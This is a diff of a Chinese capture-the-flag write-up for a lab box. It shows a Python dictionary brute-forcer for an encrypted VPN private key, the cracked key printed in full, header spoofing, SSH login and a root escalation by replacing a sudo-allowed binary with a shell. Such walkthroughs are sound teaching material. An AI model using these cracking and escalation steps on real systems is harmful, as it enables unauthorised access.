-            <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>  <span class="pl-c"># 防止卡死</span>
+    # 执行 OpenSSL 命令
+    try:
+        result = subprocess.run(
+            ["openssl", "pkcs8", "-in", KEY_FILE, "-out", OUT_FILE, "-passin", f"pass:{password}"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=5  # 防止卡死
         )
         
-        <span class="pl-c"># 检查返回码</span>
-        <span class="pl-k">if</span> <span class="pl-s1">result</span>.<span class="pl-c1">returncode</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
-            <span class="pl-k">with</span> <span class="pl-s1">found_lock</span>:
-                <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found</span>:
-                    <span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">True</span>
-                    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[+] 密码找到: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password</span><span class="pl-kos">}</span></span>"</span>)
-                    <span class="pl-en">Path</span>(<span class="pl-c1">OUT_FILE</span>).<span class="pl-c1">unlink</span>(<span class="pl-s1">missing_ok</span><span class="pl-c1">=</span><span class="pl-c1">True</span>)  <span class="pl-c"># 清理临时文件</span>
-                    <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">0</span>)
-    <span class="pl-k">except</span>:
-        <span class="pl-k">pass</span>
+        # 检查返回码
+        if result.returncode == 0:
+            with found_lock:
+                if not found:
+                    found = True
+                    print(f"\n[+] 密码找到: {password}")
+                    Path(OUT_FILE).unlink(missing_ok=True)  # 清理临时文件
+                    sys.exit(0)
+    except:
+        pass
 
-<span class="pl-k">def</span> <span class="pl-en">main</span>():
-    <span class="pl-c"># 检查文件是否存在</span>
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-en">Path</span>(<span class="pl-c1">KEY_FILE</span>).<span class="pl-c1">exists</span>():
-        <span class="pl-en">print</span>(<span class="pl-s">f"[-] 错误：私钥文件 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">KEY_FILE</span><span class="pl-kos">}</span></span> 不存在"</span>)
-        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+def main():
+    # 检查文件是否存在
+    if not Path(KEY_FILE).exists():
+        print(f"[-] 错误：私钥文件 {KEY_FILE} 不存在")
+        sys.exit(1)
     
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-en">Path</span>(<span class="pl-c1">DICT_FILE</span>).<span class="pl-c1">exists</span>():
-        <span class="pl-en">print</span>(<span class="pl-s">f"[-] 错误：字典文件 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">DICT_FILE</span><span class="pl-kos">}</span></span> 不存在"</span>)
-        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+    if not Path(DICT_FILE).exists():
+        print(f"[-] 错误：字典文件 {DICT_FILE} 不存在")
+        sys.exit(1)
     
-    <span class="pl-en">print</span>(<span class="pl-s">f"[*] 开始爆破 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">KEY_FILE</span><span class="pl-kos">}</span></span>，使用字典: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">DICT_FILE</span><span class="pl-kos">}</span></span>"</span>)
-    <span class="pl-en">print</span>(<span class="pl-s">f"[* 线程数: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">THREADS</span><span class="pl-kos">}</span></span>"</span>)
+    print(f"[*] 开始爆破 {KEY_FILE}，使用字典: {DICT_FILE}")
+    print(f"[* 线程数: {THREADS}")
 
-    <span class="pl-c"># 使用生成器逐行读取字典</span>
-    <span class="pl-k">def</span> <span class="pl-en">password_generator</span>():
-        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-c1">DICT_FILE</span>, <span class="pl-s">'r'</span>, <span class="pl-s1">errors</span><span class="pl-c1">=</span><span class="pl-s">'ignore'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
-            <span class="pl-k">for</span> <span class="pl-s1">line</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span>:
-                <span class="pl-s1">pwd</span> <span class="pl-c1">=</span> <span class="pl-s1">line</span>.<span class="pl-c1">strip</span>()
-                <span class="pl-k">if</span> <span class="pl-s1">pwd</span>:
-                    <span class="pl-k">yield</span> <span class="pl-s1">pwd</span>
+    # 使用生成器逐行读取字典
+    def password_generator():
+        with open(DICT_FILE, 'r', errors='ignore') as f:
+            for line in f:
+                pwd = line.strip()
+                if pwd:
+                    yield pwd
     
-    <span class="pl-c"># 启动线程池</span>
-    <span class="pl-k">with</span> <span class="pl-en">ThreadPoolExecutor</span>(<span class="pl-s1">max_workers</span><span class="pl-c1">=</span><span class="pl-c1">THREADS</span>) <span class="pl-k">as</span> <span class="pl-s1">executor</span>:
-        <span class="pl-k">try</span>:
-            <span class="pl-k">for</span> <span class="pl-s1">count</span>, <span class="pl-s1">pwd</span> <span class="pl-c1">in</span> <span class="pl-en">enumerate</span>(<span class="pl-en">password_generator</span>(), <span class="pl-c1">1</span>):
-                <span class="pl-k">if</span> <span class="pl-s1">found</span>:
-                    <span class="pl-k">break</span>
-                <span class="pl-s1">executor</span>.<span class="pl-c1">submit</span>(<span class="pl-s1">try_password</span>, <span class="pl-s1">pwd</span>)
-                <span class="pl-c"># 显示进度</span>
-                <span class="pl-k">if</span> <span class="pl-s1">count</span> <span class="pl-c1">%</span> <span class="pl-c1">1000</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
-                    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\r</span>[*] 已尝试 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">count</span><span class="pl-kos">}</span></span> 个密码"</span>, <span class="pl-s1">end</span><span class="pl-c1">=</span><span class="pl-s">''</span>, <span class="pl-s1">flush</span><span class="pl-c1">=</span><span class="pl-c1">True</span>)
-        <span class="pl-k">except</span> <span class="pl-v">KeyboardInterrupt</span>:
-            <span class="pl-en">print</span>(<span class="pl-s">"<span class="pl-cce">\n</span>[!] 用户中断操作"</span>)
-            <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+    # 启动线程池
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        try:
+            for count, pwd in enumerate(password_generator(), 1):
+                if found:
+                    break
+                executor.submit(try_password, pwd)
+                # 显示进度
+                if count % 1000 == 0:
+                    print(f"\r[*] 已尝试 {count} 个密码", end='', flush=True)
+        except KeyboardInterrupt:
+            print("\n[!] 用户中断操作")
+            sys.exit(1)
     
-    <span class="pl-en">print</span>(<span class="pl-s">"<span class="pl-cce">\n</span>[-] 字典穷举完毕，未找到正确密码"</span>)
+    print("\n[-] 字典穷举完毕，未找到正确密码")
 
-<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
-    <span class="pl-en">main</span>()</pre></div>
+if __name__ == "__main__":
+    main()
+</code></pre>
 <pre class="notranslate"><code class="notranslate">└─# python3 dxc.py
 [*] 开始爆破 client.key，使用字典: /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
 [* 线程数: 8
@@ -733,10 +751,10 @@ verb 3
 </code></pre>
 <p>爆破得密码：<code class="notranslate">hiro</code></p>
 <p>可以用<code class="notranslate">openssl</code>把加密私钥变成没密码的，然后 把<code class="notranslate">client.ovpn</code> 文件复制一份为<code class="notranslate">2021.ovpn</code>，再把里面的<code class="notranslate">&lt;key&gt;</code>内容换成解密后的，登陆就不用输密码了</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> openssl rsa -in client.key -out client_un.key</span>
-Enter pass phrase <span class="pl-k">for</span> client.key:<span class="pl-c"><span class="pl-c">#</span>hiro</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# openssl rsa -in client.key -out client_un.key
+Enter pass phrase for client.key:#hiro
 writing RSA key
-└─<span class="pl-c"><span class="pl-c">#</span> cat client_un.key</span>
+└─# cat client_un.key
 -----BEGIN PRIVATE KEY-----
 MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCkGK9Zvm82MWR/
 a2DauuyJPhB7kEyZG1X+0sF3jUcVqVn435xI7TIKLFb6AH2BtJSlCTH62RaYqbxk
@@ -764,22 +782,24 @@ yvcDjDOaJQ265VRxaccMmukpBjiXsmmo6ZHZUjJBAoGBAIjTXkoBeg+TlMwdls8q
 1eCE/DZfwItYfWxeqdVJ2HK6v59d+vLFAopFzRnohtEyUUY/4IUh39EL29tLk0bx
 5AxrD6ejM3nmGSNjisUbBPcu742wOl7qUYjIQDV4NE1JBbBNVaekRkrhATHEP8xZ
 wKeMlrWu46yJMi06bbPWijoJ
------END PRIVATE KEY-----</pre></div>
+-----END PRIVATE KEY-----
+</code></pre>
 <p>不要忘了前面的提示信息</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"</span>
-<span class="pl-c"><span class="pl-c">#</span> Last modified by shinosawa</span>
-<span class="pl-c"><span class="pl-c">#</span> Regenerate a STRONG password for the KEY</span>
-<span class="pl-c"><span class="pl-c">#</span> Do NOT use a SAME password as other services et. SSH</span></pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"
+# Last modified by shinosawa
+# Regenerate a STRONG password for the KEY
+# Do NOT use a SAME password as other services et. SSH
+</code></pre>
 <h5>获得<code class="notranslate">ssh</code>密码</h5>
 <p>用户名<code class="notranslate">shinosawa</code>，<code class="notranslate">ssh</code>密码：<code class="notranslate">hiro</code>，现在还不能直接<code class="notranslate">ssh</code>登陆（可尝试虚拟机本地登录），因为<code class="notranslate">ssh</code>服务要通过<code class="notranslate">openvpn</code>进</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> openvpn 2021.vpn</span>
-2025-05-14 21:37:02 Note: Kernel support <span class="pl-k">for</span> ovpn-dco missing, disabling data channel offload.
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# openvpn 2021.vpn
+2025-05-14 21:37:02 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
 2025-05-14 21:37:02 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
 2025-05-14 21:37:02 library versions: OpenSSL 3.4.0 22 Oct 2024, LZO 2.10
 2025-05-14 21:37:02 DCO version: N/A
-2025-05-14 21:37:02 WARNING: No server certificate verification method has been enabled.  See http://openvpn.net/howto.html#mitm <span class="pl-k">for</span> more info.
+2025-05-14 21:37:02 WARNING: No server certificate verification method has been enabled.  See http://openvpn.net/howto.html#mitm for more info.
 2025-05-14 21:37:02 TCP/UDP: Preserving recently used remote address: [AF_INET]192.168.31.65:1194
-2025-05-14 21:37:02 Socket Buffers: R=[212992-<span class="pl-k">&gt;</span>212992] S=[212992-<span class="pl-k">&gt;</span>212992]
+2025-05-14 21:37:02 Socket Buffers: R=[212992-&gt;212992] S=[212992-&gt;212992]
 2025-05-14 21:37:02 UDPv4 link local: (not bound)
 2025-05-14 21:37:02 UDPv4 link remote: [AF_INET]192.168.31.65:1194
 2025-05-14 21:37:02 TLS: Initial packet from [AF_INET]192.168.31.65:1194, sid=8ad9a8fe 421c5c41
@@ -789,113 +809,120 @@ wKeMlrWu46yJMi06bbPWijoJ
 2025-05-14 21:37:02 [server] Peer Connection Initiated with [AF_INET]192.168.31.65:1194
 2025-05-14 21:37:02 TLS: move_session: dest=TM_ACTIVE src=TM_INITIAL reinit_src=1
 2025-05-14 21:37:02 TLS: tls_multi_process: initial untrusted session promoted to trusted
-2025-05-14 21:37:02 PUSH: Received control message: <span class="pl-s"><span class="pl-pds">'</span>PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500<span class="pl-pds">'</span></span>
+2025-05-14 21:37:02 PUSH: Received control message: 'PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500'
 2025-05-14 21:37:02 OPTIONS IMPORT: --ifconfig/up options modified
 2025-05-14 21:37:02 OPTIONS IMPORT: route options modified
 2025-05-14 21:37:02 OPTIONS IMPORT: route-related options modified
 2025-05-14 21:37:02 OPTIONS IMPORT: --ip-win32 and/or --dhcp-option options modified
-2025-05-14 21:37:02 OPTIONS IMPORT: tun-mtu <span class="pl-c1">set</span> to 1500
+2025-05-14 21:37:02 OPTIONS IMPORT: tun-mtu set to 1500
 2025-05-14 21:37:02 net_route_v4_best_gw query: dst 0.0.0.0
 2025-05-14 21:37:02 net_route_v4_best_gw result: via 192.168.31.1 dev eth0
 2025-05-14 21:37:02 ROUTE_GATEWAY 192.168.31.1/255.255.255.0 IFACE=eth0 HWADDR=5e:bb:f6:9e:ee:fa
 2025-05-14 21:37:02 TUN/TAP device tun0 opened
-2025-05-14 21:37:02 net_iface_mtu_set: mtu 1500 <span class="pl-k">for</span> tun0
-2025-05-14 21:37:02 net_iface_up: <span class="pl-c1">set</span> tun0 up
+2025-05-14 21:37:02 net_iface_mtu_set: mtu 1500 for tun0
+2025-05-14 21:37:02 net_iface_up: set tun0 up
 2025-05-14 21:37:02 net_addr_v4_add: 10.8.0.2/24 dev tun0
 2025-05-14 21:37:02 net_route_v4_add: 10.176.13.0/24 via 10.8.0.1 dev [NULL] table 0 metric -1
 2025-05-14 21:37:02 Initialization Sequence Completed
-2025-05-14 21:37:02 Data Channel: cipher <span class="pl-s"><span class="pl-pds">'</span>AES-256-GCM<span class="pl-pds">'</span></span>, peer-id: 1
+2025-05-14 21:37:02 Data Channel: cipher 'AES-256-GCM', peer-id: 1
 2025-05-14 21:37:02 Timers: ping 10, ping-restart 120
-2025-05-14 21:37:02 Protocol options: protocol-flags cc-exit tls-ekm dyn-tls-crypt</pre></div>
+2025-05-14 21:37:02 Protocol options: protocol-flags cc-exit tls-ekm dyn-tls-crypt
+</code></pre>
 <p>建立<code class="notranslate">vpn</code>链接后，网卡上多了个隧道<code class="notranslate">tun0</code>网卡</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ip a</span>
-5: tun0: <span class="pl-k">&lt;</span>POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# ip a
+5: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
     link/none
     inet 10.8.0.2/24 scope global tun0
        valid_lft forever preferred_lft forever
     inet6 fe80::c059:a5bc:2a14:2d2e/64 scope link stable-privacy
        valid_lft forever preferred_lft forever
-└─<span class="pl-c"><span class="pl-c">#</span> route -n</span>
+└─# route -n
 10.176.13.0     10.8.0.1        255.255.255.0   UG    0      0        0 tun0
 
-<span class="pl-c"><span class="pl-c">#</span>openvpn 2021.vpn中配置</span>
-Received control message: <span class="pl-s"><span class="pl-pds">'</span>PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500<span class="pl-pds">'</span></span></pre></div>
+#openvpn 2021.vpn中配置
+Received control message: 'PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500'
+</code></pre>
 <p>通过<code class="notranslate">openvpn</code>配置信息或者<code class="notranslate">kali路由表</code>可以查到靶机<code class="notranslate">vpn</code>网段为<code class="notranslate">10.176.13.0/24</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> nmap 10.176.13.0/24 -sn</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# nmap 10.176.13.0/24 -sn
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 21:43 CST
-Nmap scan report <span class="pl-k">for</span> 10.176.13.37 (10.176.13.37)
+Nmap scan report for 10.176.13.37 (10.176.13.37)
 Host is up (0.0024s latency).
-Nmap done: 256 IP addresses (1 host up) scanned <span class="pl-k">in</span> 14.57 seconds
-└─<span class="pl-c"><span class="pl-c">#</span> nmap 10.176.13.37</span>
+Nmap done: 256 IP addresses (1 host up) scanned in 14.57 seconds
+└─# nmap 10.176.13.37
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 21:45 CST
-Nmap scan report <span class="pl-k">for</span> 10.176.13.37 (10.176.13.37)
+Nmap scan report for 10.176.13.37 (10.176.13.37)
 Host is up (0.0077s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.74 seconds
-└─<span class="pl-c"><span class="pl-c">#</span> ssh shinosawa@10.176.13.37</span>
-shinosawa@10.176.13.37<span class="pl-s"><span class="pl-pds">'</span>s password:#hiro</span>
-<span class="pl-s">homelab:~$ id</span>
-<span class="pl-s">uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)</span>
-<span class="pl-s"></span></pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
+└─# ssh shinosawa@10.176.13.37
+shinosawa@10.176.13.37's password:#hiro
+homelab:~$ id
+uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)
+
+</code></pre>
 <p>用户名<code class="notranslate">shinosawa</code>，<code class="notranslate">ssh</code>密码：<code class="notranslate">hiro</code></p>
 <h5>拿到<code class="notranslate">user.flag</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">homelab:<span class="pl-k">~</span>$ id
+<pre lang="shell" class="notranslate"><code class="notranslate">homelab:~$ id
 uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)
-homelab:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
-homelab:<span class="pl-k">~</span>$ ls
+homelab:~$ cd
+homelab:~$ ls
 deepseek   user.flag
-homelab:<span class="pl-k">~</span>$ cat user.flag
-</pre></div>
+homelab:~$ cat user.flag
+
+</code></pre>
 <h3>获得root</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">homelab:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> shinosawa on homelab:
-    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+<pre lang="shell" class="notranslate"><code class="notranslate">homelab:~$ sudo -l
+Matching Defaults entries for shinosawa on homelab:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-Runas and Command-specific defaults <span class="pl-k">for</span> shinosawa:
-    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>
+Runas and Command-specific defaults for shinosawa:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
 
 User shinosawa may run the following commands on homelab:
     (ALL) NOPASSWD: /home/shinosawa/deepseek
-homelab:<span class="pl-k">~</span>$ ls -l deepseek
--r-xr-xr-x    1 shinosawa shinosawa     18888 Apr 17 13:38 deepseek</pre></div>
+homelab:~$ ls -l deepseek
+-r-xr-xr-x    1 shinosawa shinosawa     18888 Apr 17 13:38 deepseek
+</code></pre>
 <p><code class="notranslate">shinosawa</code>家目录下有个<code class="notranslate">deepseek</code>，属组还是自己，直接劫持文件提权（在自己家目录即使<code class="notranslate">root</code>属组的也可以直接劫持），注意看<code class="notranslate">/etc/passwd</code>文件，靶机默认的终端是<code class="notranslate">ash</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">homelab:<span class="pl-k">~</span>$ mv deepseek a
-homelab:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> shinosawa on homelab:
-    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+<pre lang="shell" class="notranslate"><code class="notranslate">homelab:~$ mv deepseek a
+homelab:~$ sudo -l
+Matching Defaults entries for shinosawa on homelab:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-Runas and Command-specific defaults <span class="pl-k">for</span> shinosawa:
-    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>
+Runas and Command-specific defaults for shinosawa:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
 
 User shinosawa may run the following commands on homelab:
     (ALL) NOPASSWD: /home/shinosawa/deepseek
-homelab:<span class="pl-k">~</span>$ cat /etc/passwd
+homelab:~$ cat /etc/passwd
 ..........
 shinosawa:x:1000:1000::/home/shinosawa:/bin/ash
-homelab:<span class="pl-k">~</span>$
-homelab:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> ash <span class="pl-k">&gt;</span> deepseek
-homelab:<span class="pl-k">~</span>$ chmod +x deepseek
-homelab:<span class="pl-k">~</span>$ sudo /home/shinosawa/deepseek
-/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> id</span>
+homelab:~$
+homelab:~$ echo ash &gt; deepseek
+homelab:~$ chmod +x deepseek
+homelab:~$ sudo /home/shinosawa/deepseek
+/home/shinosawa # id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> cd</span>
-<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> ls -l</span>
+/home/shinosawa # cd
+~ # ls -l
 total 28
 -r-xr-xr-x    1 shinosawa shinosawa     18888 Apr 17 13:38 a
 -rwxr-xr-x    1 shinosawa shinosawa         4 May 15 05:39 deepseek
 -r--------    1 shinosawa shinosawa        39 Apr 17 12:29 user.flag
-homelab:<span class="pl-k">~</span>$</pre></div>
+homelab:~$
+</code></pre>
 <h5>拿到<code class="notranslate">root.flag</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> id</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">/home/shinosawa # id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> cd</span>
-<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> ls</span>
+/home/shinosawa # cd
+~ # ls
 root.flag
-<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> cat root.flag</span></pre></div></div>
+~ # cat root.flag
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
